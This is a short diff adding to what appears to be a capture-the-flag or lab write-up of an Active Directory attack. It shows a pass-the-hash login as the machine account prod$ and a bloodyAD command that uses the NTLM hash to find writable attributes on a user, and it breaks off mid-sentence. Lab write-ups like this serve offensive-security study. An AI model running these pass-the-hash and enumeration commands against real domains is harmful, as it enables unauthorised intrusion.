@@ -563,3 +563,13 @@ SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025
 SMB         10.0.29.162     445    DC01             [+] fragments.local\prod$:b43cb2fcadff72ff9136a2f42218c430
 ```
 
+# Enumeration as `prod$`
+
+```python
+bloodyAD --host dc01.fragments.local -d fragments.local -u 'prod$' -p ':b43cb2fcadff72ff9136a2f42218c430' get writable --detail
+
+distinguishedName: CN=David DG. Goggins,CN=Users,DC=fragments,DC=local
+logonHours: WRITE
+```
+
+This is where i can modiy the logon hours of this 
